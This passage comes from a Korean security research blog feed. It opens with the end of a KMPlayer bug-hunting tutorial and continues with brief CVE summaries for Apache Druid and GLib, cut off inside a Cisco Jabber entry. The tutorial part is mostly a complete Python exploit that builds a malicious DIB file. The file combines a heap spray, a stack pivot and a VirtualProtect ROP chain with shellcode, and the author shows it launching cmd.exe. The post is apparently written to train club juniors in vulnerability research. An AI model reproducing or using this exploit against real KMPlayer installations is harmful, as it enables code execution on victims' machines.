&#xBA54;&#xBAA8;&#xB9AC;&#xB4E4;&#xC744; &#xC2A4;&#xD0B5;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC544;&#xB798; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xB85C; &#xD53C;&#xBD07; &#xD588;&#xC73C;&#xBA74; &#xADF8; &#xBD80;&#xBD84;&#xC5D0;&#xB3C4; <code>ret</code>&#xC73C;&#xB85C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xC880; &#xB354; &#xC815;&#xD655;&#xB3C4;&#xAC00; &#xB192;&#xC544;&#xC9C0;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E;</p><p>&#xADF8;&#xB7FC; &#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" alt="bughunting-tutorials-part4/Untitled.png"></p><p>&#xC544;&#xB798;&#xB294; &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_rop_chain</span>():</span><span class="hljs-comment"># rop chain generated with mona.py - www.corelan.be</span>rop_gadgets = [<span class="hljs-number">0x00453c50</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d6a848</span>, <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT KMPlayer.exe]</span><span class="hljs-number">0x0094eb72</span>, <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]</span><span class="hljs-number">0x007d2499</span>, <span class="hljs-comment"># XCHG EAX,ESI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00652cb0</span>, <span class="hljs-comment"># POP EBP # RETN [KMPlayer.exe]</span><span class="hljs-number">0x0042390c</span>, <span class="hljs-comment"># &amp; jmp esp [KMPlayer.exe]</span><span class="hljs-number">0x004c0267</span>, <span class="hljs-comment"># POP EBX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000201</span>, <span class="hljs-comment"># 0x00000201-&gt; ebx</span><span class="hljs-number">0x0052d95d</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000040</span>, <span class="hljs-comment"># 0x00000040-&gt; edx</span><span class="hljs-number">0x0082f8e0</span>, <span class="hljs-comment"># POP ECX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d0aafc</span>, <span class="hljs-comment"># &amp;Writable location [KMPlayer.exe]</span><span class="hljs-number">0x009fc414</span>, <span class="hljs-comment"># POP EDI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00426485</span>, <span class="hljs-comment"># RETN (ROP NOP) [KMPlayer.exe]</span><span class="hljs-number">0x0068c402</span>, <span class="hljs-comment"># POP EAX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span><span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>]<span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(pack(<span class="hljs-string">&apos;&lt;I&apos;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)<span class="hljs-comment">#shellcode for runnig cmd.exe</span>shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>shellcode += <span class="hljs-string">&quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&quot;</span>shellcode += <span class="hljs-string">&quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&quot;</span>shellcode += <span class="hljs-string">&quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&quot;</span>shellcode += <span class="hljs-string">&quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&quot;</span>shellcode += <span class="hljs-string">&quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&quot;</span>shellcode += <span class="hljs-string">&quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&quot;</span>shellcode += <span class="hljs-string">&quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&quot;</span>shellcode += <span class="hljs-string">&quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&quot;</span>shellcode += <span class="hljs-string">&quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&quot;</span>shellcode += <span class="hljs-string">&quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&quot;</span>shellcode += <span class="hljs-string">&quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&quot;</span>shellcode += <span class="hljs-string">&quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&quot;</span>shellcode += <span class="hljs-string">&quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&quot;</span>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)up = <span class="hljs-keyword">lambda</span> x : unpack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)[<span class="hljs-number">0</span>]rop_chain = create_rop_chain()BITMAPFILEHEADER = OrderedDict()BITMAPINFOHEADER = OrderedDict()BITMAPINFOHEADER[<span class="hljs-string">&apos;biSize&apos;</span>] = <span class="hljs-string">&apos;\x28\x1f\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x28</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&apos;biPlanes&apos;</span>] = <span class="hljs-string">&apos;\x01\x00&apos;</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biBitCount&apos;</span>] = <span class="hljs-string">&apos;\x18\x00&apos;</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biCompression&apos;</span>] = <span class="hljs-string">&apos;\x00\x0a\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>]) *up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>])))BITMAPINFOHEADER[<span class="hljs-string">&apos;biXPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biYPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrUsed&apos;</span>] = <span class="hljs-string">&apos;\x00\x02\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrImportant&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>BITMAPFILEHEADER[<span class="hljs-string">&apos;bfType&apos;</span>] = <span class="hljs-string">&apos;BM&apos;</span>BITMAPFILEHEADER[<span class="hljs-string">&apos;bfsize&apos;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) + <span class="hljs-number">0x36</span>)BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved1&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved2&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>BITMAPFILEHEADER[<span class="hljs-string">&apos;bfOffBits&apos;</span>] = <span class="hljs-string">&apos;\x36\x00\x00\x00&apos;</span>head = <span class="hljs-string">&apos;Fandu_&apos;</span>tail = <span class="hljs-string">&apos;FANDU_&apos;</span>spray = <span class="hljs-string">&apos;\x11&apos;</span>stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment"># RETN</span>offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>payload = <span class="hljs-string">&apos;&apos;</span>payload += head +<span class="hljs-string">&apos;aa&apos;</span>payload += spray * offset1payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)payload += rop_chainpayload += shellcodepayload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>payload += tailexploit = <span class="hljs-string">&apos;&apos;</span><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :exploit += BITMAPFILEHEADER[key]<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPINFOHEADER.keys() :exploit += BITMAPINFOHEADER[key]exploit += payloadf = open(<span class="hljs-string">&apos;./exploit.dib&apos;</span>, <span class="hljs-string">&apos;wb&apos;</span>)f.write(exploit)f.close()</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; &#xB5A8;&#xAD88;&#xC9C4; <code>exploit.dib</code> &#xD30C;&#xC77C;&#xC744; KMPlayer&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" alt="bughunting-tutorials-part4/image--076.png"></p><p>&#xC774;&#xB807;&#xAC8C; <code>cmd.exe</code>&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;!!! &#xC9DD;&#xC9DD;&#xC9DD; &#x314E;&#x314E;&#x314E;&#x314E;&#x314E;&#x314E;</p><h1 id="&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;"><a href="#&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;" class="headerlink" title="&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;"></a>&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;</h1><p>&#xC73C;&#xC73C; &#xB4DC;&#xB514;&#xC5B4; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#x314B;&#x314B; &#xC6D0;&#xB798; 12 &#xC6D4; &#xC911;&#xC21C;&#xC778;&#xAC00; &#xB9D0;&#xC778;&#xAC00; &#xC2DC;&#xC791;&#xD588;&#xB294; &#xB370; 1 &#xC6D4;&#xC5D0; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00; &#xC788;&#xC5B4; &#xAC00;&#xC9C0;&#xACE0; &#xC774;&#xC81C;&#xC57C; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#xD6C4;&#xC6B0;&#x2026; &#xC5ED;&#xC2DC; &#xB098; &#xC0C8;&#xB07C;&#xB294; &#xAC8C;&#xC73C;&#xB978; &#xB188;&#x2026;.</p><p>&#xC6D0;&#xB798; &#xC774; &#xAE00;&#xC744; &#xC4F4; &#xC774;&#xC720;&#xAC00; &#xB3D9;&#xC544;&#xB9AC; &#xD6C4;&#xBC30;&#xB4E4; &#xAD50;&#xC721;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xC0AC;&#xC2E4; &#xC804;&#xC5D0; cdpython &#xD615;&#xC774; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xAE00; &#xC4F0;&#xBA74; &#xC88B;&#xC744; &#xAC70; &#xAC19;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xC4F0;&#xAC8C; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xB9CE;&#xC740; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xC694;&#xC998; &#xB108;&#xBB34; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC774;&#xB7F0; &#xAC70; &#xBCF4;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xC788;&#xACA0;&#xB0D0;&#xB9CC;&#xC740;&#x2026; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xC774;&#xAC70; &#xBCF4;&#xC9C0;&#xB3C4; &#xC54A;&#xACA0;&#xC9C0;&#x2026; &#xC96C;&#xB975; &#xB098;&#xB3C4; &#xC774;&#xC81C; &#xC798;&#xD574;&#xC57C;&#xC9C0;&#x2026;. &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC77C;&#xB2E8; &#xC878;&#xC5C5;&#xBD80;&#xD130; &#xD558;&#xC988;&#xC544;&#xC544;&#xC544;&#xC544; &#x3160;&#x3160;&#x3160;&#x3160;</p><p>&#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC774; &#xC815;&#xB3C4;&#xB77C;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xCC44;&#xCC0D;&#xC9C8; &#xD574;&#xC900; passket, combabo, cdpython, morinori89 &#xD615;&#xB4E4; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2FC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xD6C4;&#xC6B0;&#x2026;. &#xC0AC;&#xC2E4; &#xD615;&#xB4E4;&#xC774;&#xB791; &#xC81C;&#xC77C; &#xB9CE;&#xC774; &#xD55C; &#xAC70;&#xB294; &#xD574;&#xD0B9;&#xBCF4;&#xB2E4;&#xB294; &#xC220; &#xCC98;&#xBA39;&#xB294; &#xAC70; &#xAC19;&#xC9C0;&#xB9CC;&#x2026;. &#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC11C; &#xD53C;&#xB4DC;&#xBC31; &#xC900; SSG &#xD6C4;&#xBC30;&#xB4E4; Frozenbeer &#xB561;&#xD050;&#xB561;&#xD050; &#x314B;&#x314B;&#x314B;</p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC990;&#xD58C;!!!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-25646: Apache Druid 원격 코드 실행 취약점</title>
    <link href="/2021/03/31/fabu1ous/2021-03-31/"/>
    <url>/2021/03/31/fabu1ous/2021-03-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/25/cve-2021-25646-getting-code-execution-on-apache-druid">CVE-2021-25646 : Getting Code Execution on Apache Druid</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Apache Druid &lt;= 0.20.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Druid&#xB294; Request&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC81C;&#xACF5; JavaScript&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774;  &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; &#xC2E0;&#xB8B0;&#xB3C4;&#xAC00; &#xB192;&#xC740; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xC774;&#xBBC0;&#xB85C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Druid 0.20.0 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC11C;&#xBC84; &#xAD6C;&#xC131;&#xC5D0; &#xAD00;&#xACC4;&#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD55C; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;(CVE-2021-25646)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; Druid &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC;&#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>CVE-2021-25646&#xC740; Apache Druid&#xC758; Jackson&#xC774; JavaScript &#xD0C0;&#xC785;&#xC758; JSON &#xB370;&#xC774;&#xD130; &#xAD6C;&#xBB38;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">JavaScriptDimFilter</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension, <span class="hljs-meta">@JsonProperty(&quot;function&quot;)</span> </span></span><span class="hljs-function"><span class="hljs-params">            String function, <span class="hljs-meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="hljs-meta">@Nullable</span> ExtractionFn extractionFn, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="hljs-meta">@Nullable</span> FilterTuning filterTuning, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JacksonInject</span> JavaScriptConfig config)</span> </span><span class="hljs-function"></span>{   Preconditions.checkArgument(dimension != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;dimension must not be null&quot;</span>);   Preconditions.checkArgument(function != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;function must not be null&quot;</span>);   <span class="hljs-keyword">this</span>.dimension = dimension;   <span class="hljs-keyword">this</span>.function = function;   <span class="hljs-keyword">this</span>.extractionFn = extractionFn;   <span class="hljs-keyword">this</span>.filterTuning = filterTuning;   <span class="hljs-keyword">this</span>.config = config; }</code></pre><p>JSON &#xB370;&#xC774;&#xD130;&#xC758;  <code>name</code>&#xC18D;&#xC131;&#xC774;  &#x201C;&#x201D;&#xC77C; &#xB54C; &#xBE48; &#xD0A4;&#xAC12;&#xC744; JavaScriptDimFilter &#xD074;&#xB798;&#xC2A4;&#xC758;  <code>config</code>&#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; &#xBC14;&#xC778;&#xB529; &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xB294; JavaScript &#xC2E4;&#xD589; &#xC124;&#xC815;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xC5EC; <code>function</code> &#xD0A4;&#xAC12;&#xC73C;&#xB85C; &#xC81C;&#xACF5;&#xD55C; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD57C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>apache</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27219: GLib의 integer overflow 취약점</title>
    <link href="/2021/03/30/l0ch/2021-03-30/"/>
    <url>/2021/03/30/l0ch/2021-03-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-045-g_bytes_new/">GHSL-2021-045: Integer Overflow in GLib - CVE-2021-27219</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>&#xD14C;&#xC2A4;&#xD2B8;&#xB41C; &#xBC84;&#xC804;</p><ul><li>Ubuntu 20.04 (x86_64) : &#xBC84;&#xC804; 2.64.6-1</li><li>CentOS Stream (x86_64) : &#xBC84;&#xC804; 2.56.4-9</li><li>archlinux (x86_64) : 2.66.4-2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>64&#xBE44;&#xD2B8; &#xD50C;&#xB7AB;&#xD3FC;&#xC758; glib&#xC5D0;&#xC11C; &#xC554;&#xC2DC;&#xC801; &#xD615; &#xBCC0;&#xD658;&#xC73C;&#xB85C; &#xC778;&#xD55C; integer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB370;&#xC774;&#xD130;&#xB85C;&#xBD80;&#xD130; <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#GBytes">GBytes</a> &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#g-bytes-new">g_bytes_new()</a> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">GBytes * g_bytes_new (gconstpointer data, gsize size){  g_return_val_if_fail (data != NULL || size == <span class="hljs-number">0</span>, NULL);<span class="hljs-comment">//integer overflow</span>  <span class="hljs-keyword">return</span> g_bytes_new_take(g_memdup (data, size), size);  }</code></pre><p>64bit &#xC790;&#xB8CC;&#xD615;&#xC778; <code>gsize</code> &#xD615; <code>size</code>&#xB97C; <code>g_memdup</code> &#xD568;&#xC218;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">//g_memdup &#xD568;&#xC218; &#xC6D0;&#xD615;</span>g_memdup(gconstpointer mem, guint byte_size);</code></pre><p>&#xADF8;&#xB7EC;&#xB098; <code>g_memdup</code>&#xC740; &#xD574;&#xB2F9; &#xC778;&#xC790;&#xB97C; 32bit &#xC790;&#xB8CC;&#xD615; <code>guint</code>&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xC554;&#xC2DC;&#xC801; &#xD615; &#xBCC0;&#xD658;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD6E8;&#xC52C; &#xC791;&#xC740; &#xB370;&#xC774;&#xD130; &#xBC84;&#xD37C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; GBytes &#xAC1D;&#xCCB4;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xACE0; &#xC774;&#xB294; memory corruption &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xD788;&#xC2A4;&#xD1A0;&#xB9AC;&#xB294; <a href="https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits">https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits</a> &#xC5D0;&#xC11C; &#xD655;&#xC778; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>integer overflow</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Cisco Jabber에서 발견된 5가지 취약점</title>
    <link href="/2021/03/29/idioth/2021-03-29/"/>
    <url>/2021/03/29/idioth/2021-03-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-jabber-PWrTATTC">Cisco Jabber Desktop and Mobile Client Software Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Jabber for Windows, MacOS, mobile Platforms</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC5B8;&#xC81C; &#xC5B4;&#xB514;&#xC11C;&#xB098; &#xAE30;&#xAE30;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC9C1;&#xC6D0;&#xC758; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4; &#xD655;&#xC778; &#xBC0F; &#xCC44;&#xD305;, &#xC74C;&#xC131; &#xD1B5;&#xD654;, &#xD68C;&#xC758; &#xB4F1;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; UC 